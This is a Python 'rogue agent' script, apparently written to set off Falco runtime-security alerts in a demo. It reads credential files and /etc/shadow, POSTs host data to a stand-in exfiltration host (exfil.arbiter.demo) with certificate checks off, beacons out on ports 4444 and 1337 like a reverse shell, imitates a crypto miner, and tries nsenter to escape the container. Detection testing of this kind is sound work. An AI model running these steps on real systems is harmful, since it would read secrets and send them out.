#!/usr/bin/env python3
"""Rogue agent that triggers Falco detection signatures — for demo/testing only."""

import argparse
import json
import os
import socket
import subprocess
import sys
import time
import urllib.request
import ssl

DEFAULT_EXFIL_URL = "https://exfil.arbiter.demo:9443/exfil"

HONEYPOT_PATHS = [
    "/root/.aws/credentials",
    "/root/.ssh/id_rsa_canary",
    "/root/.kube/config",
]

SENSITIVE_FILES = [
    "/etc/shadow",
    "/etc/gshadow",
    "/etc/security/opasswd",
]


def log_event(action: str, **kwargs):
    print(json.dumps({"ts": time.time(), "agent": "rogue", "action": action, **kwargs}), flush=True)


def attempt_credential_theft():
    """Read honeypot credentials — triggers Falco 'Read sensitive file untrusted'."""
    for path in HONEYPOT_PATHS:
        try:
            with open(path) as f:
                content = f.read()
            log_event("credential_read", path=path, size=len(content), status="success")
        except Exception as e:
            log_event("credential_read", path=path, status="failed", error=str(e))


def attempt_sensitive_file_read():
    """Read /etc/shadow etc — triggers Falco 'Read sensitive file'."""
    for path in SENSITIVE_FILES:
        try:
            with open(path) as f:
                content = f.read()
            log_event("sensitive_read", path=path, size=len(content), status="success")
        except Exception as e:
            log_event("sensitive_read", path=path, status="failed", error=str(e))


def attempt_exfiltration(exfil_url: str):
    """POST stolen data to external endpoint — triggers Falco network alerts."""
    payload = json.dumps({
        "hostname": socket.gethostname(),
        "env": {k: v for k, v in os.environ.items() if k in ("HOME", "USER", "PATH", "HOSTNAME")},
        "creds_found": [p for p in HONEYPOT_PATHS if os.path.exists(p)],
    }).encode()

    log_event("exfil_attempt", url=exfil_url, payload_size=len(payload))
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(exfil_url, data=payload, headers={"Content-Type": "application/json"})
        resp = urllib.request.urlopen(req, timeout=5, context=ctx)
        log_event("exfil_result", status=resp.status)
    except Exception as e:
        log_event("exfil_result", status="failed", error=str(e))


def attempt_reverse_shell():
    """Connect outbound on suspicious port — triggers Falco 'Launch Suspicious Network Tool'."""
    targets = [("exfil.arbiter.demo", 4444), ("exfil.arbiter.demo", 1337)]
    for host, port in targets:
        log_event("reverse_shell_attempt", host=host, port=port)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((host, port))
            s.sendall(b"ROGUE_AGENT_BEACON\n")
            s.close()
            log_event("reverse_shell_result", host=host, port=port, status="connected")
        except Exception as e:
            log_event("reverse_shell_result", host=host, port=port, status="failed", error=str(e))


def attempt_crypto_miner_signature():
    """Spawn process with miner-like name — triggers Falco 'Detect crypto miners'."""
    log_event("miner_signature_attempt")
    try:
        proc = subprocess.Popen(
            [sys.executable, "-c", "import time; time.sleep(2)"],
            env={**os.environ, "PROC_NAME": "xmrig"},
        )
        log_event("miner_signature_spawned", pid=proc.pid)
        proc.wait(timeout=5)
    except Exception as e:
        log_event("miner_signature_result", status="failed", error=str(e))


def attempt_container_escape_probe():
    """Probe container boundaries — triggers Falco 'Container Drift Detected'."""
    probes = [
        ("/proc/1/cgroup", "cgroup probe"),
        ("/proc/self/status", "capabilities probe"),
        ("/.dockerenv", "docker marker probe"),
    ]
    for path, desc in probes:
        try:
            with open(path) as f:
                content = f.read(512)
            log_event("escape_probe", probe=desc, path=path, content_len=len(content))
        except Exception as e:
            log_event("escape_probe", probe=desc, path=path, status="failed", error=str(e))

    log_event("nsenter_attempt")
    try:
        result = subprocess.run(
            ["nsenter", "--target", "1", "--mount", "--", "ls", "/"],
            capture_output=True, timeout=5,
        )
        log_event("nsenter_result", rc=result.returncode, stderr=result.stderr.decode()[:200])
    except Exception as e:
        log_event("nsenter_result", status="failed", error=str(e))


def run_all_attacks(exfil_url: str, delay: float):
    attacks = [
        ("credential_theft", attempt_credential_theft),
        ("sensitive_file_read", attempt_sensitive_file_read),
        ("exfiltration", lambda: attempt_exfiltration(exfil_url)),
        ("reverse_shell", attempt_reverse_shell),
        ("crypto_miner", attempt_crypto_miner_signature),
        ("container_escape", attempt_container_escape_probe),
    ]

    log_event("rogue_start", attack_count=len(attacks), delay=delay)
    for name, fn in attacks:
        log_event("attack_phase", phase=name)
        try:
            fn()
        except Exception as e:
            log_event("attack_error", phase=name, error=str(e))
        if delay > 0:
            time.sleep(delay)
    log_event("rogue_complete")


def main():
    parser = argparse.ArgumentParser(description="Rogue agent for Falco detection demo — triggers security alerts")
    parser.add_argument("--exfil-url", default=DEFAULT_EXFIL_URL, help="Exfiltration target URL")
    parser.add_argument("--delay", type=float, default=2.0, help="Seconds between attack phases")
    parser.add_argument("--loop", type=int, default=0, help="Loop interval in seconds (0=single run)")
    args = parser.parse_args()

    if args.loop > 0:
        while True:
            run_all_attacks(args.exfil_url, args.delay)
            time.sleep(args.loop)
    else:
        run_all_attacks(args.exfil_url, args.delay)


if __name__ == "__main__":
    main()
